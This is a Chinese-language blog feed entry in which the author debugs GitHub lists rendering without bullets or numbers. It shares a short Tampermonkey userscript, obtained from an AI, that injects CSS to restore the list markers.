    <id>https://zjw1nd.github.io/2024/12/17/%E5%89%8D%E7%AB%AF%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B9%8B%E4%BF%AE%E5%A4%8Dgithub%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E9%94%99%E8%AF%AF/</id>
    <published>2024-12-16T16:21:39.000Z</published>
    <updated>2024-12-17T02:50:21.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因-问题描述">起因/问题描述</h2><p>今天兴致来了上头了想编辑自己的Github主页，写好之后突然发现所有的<strong>列表</strong>都丢失了前缀。即本来应该是：</p><blockquote><p>1. xxx<br>2. xxx<br>· xxx</p></blockquote><p>但是实际渲染出来的效果只有缩进对齐而没有这些序号和点的前缀，看起来非常的难受，遂开始排查问题。</p><h2 id="检查过程">检查过程</h2><p>首先肯定是检查了源代码，markdown确认没有问题之后去github随便搜了个markdown的教程，发现也有这个问题，看来问题出在本地。</p><p>F12检查了一下源代码，markdown最后会被渲染成list：有序列表和无序列表分别是css中的ol和ul样式，列表项则是<code>&lt;li&gt;</code>。html中会采用<code>&lt;ul&gt;&lt;/ul&gt;</code>标签进行实现。</p><p>检查CSS样式发现，<code>&lt;li&gt;</code>对象的一个元素<code>list-style-type</code>的值居然是none，在注入的样式里覆盖了浏览器自己的User Agent样式。</p><p>打开一个列表显示正常的网站检查一下，要想显示前缀，这一项的值应该是<code>disc</code>才对。同时更换浏览器用手机打开发现是正常的</p><p>虽然我们不知道github提供的样式出了什么问题，但是我们似乎本地也不好修这个问题。</p><h2 id="结果">结果</h2><p>问AI，ai给了我一个tamper monkey的脚本：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         GitHub List Style Fix</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  Change github list.</span></span><br><span class="line"><span class="comment">// @author       Zj_W1nd</span></span><br><span class="line"><span class="comment">// @match        https://github.com/*</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加自定义样式</span></span><br><span class="line">    <span class="keyword">const</span> style = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">    style.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">        ul, ol &#123;</span></span><br><span class="line"><span class="string">            list-style-type: disc !important;</span></span><br><span class="line"><span class="string">            margin-left: 20px !important;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    `</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>在github网页上强制修改前端的列表style，还真解决了这个问题。这么一搞感觉前端就是疯狂的各种标签和字段。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因-问题描述&quot;&gt;起因/问题描述&lt;/h2&gt;
&lt;p&gt;今天兴致来了上头了想编辑自己的Github主页，写好之后突然发现所有的&lt;strong&gt;列表&lt;/strong&gt;都丢失了前缀。即本来应该是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. xxx&lt;br&gt;
2. xxx&lt;</summary>
      
    
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/categories/Develop/"/>
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/tags/Develop/"/>
    
    <category term="前端" scheme="https://zjw1nd.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
</feed>
